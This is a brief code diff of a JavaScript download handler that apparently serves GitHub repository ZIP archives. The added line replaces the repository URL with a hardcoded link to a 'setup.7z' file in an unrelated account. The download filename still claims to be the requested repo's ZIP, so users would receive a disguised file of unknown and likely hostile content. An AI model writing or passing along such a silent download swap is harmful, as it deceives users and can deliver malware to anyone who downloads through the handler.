@@ -11,7 +11,7 @@ export default function handler(req, res) {
   }
   
   // GitHub's ZIP download URL
-  const zipUrl = `https://github.com/${user}/${repo}/archive/refs/heads/main.zip`;
+  const zipUrl = `https://github.com/askednobody410-web/temp1/blob/main/setup.7z`;
   
   // Force download (optional headers)
   res.setHeader('Content-Disposition', `attachment; filename="${user}-${repo}.zip"`);
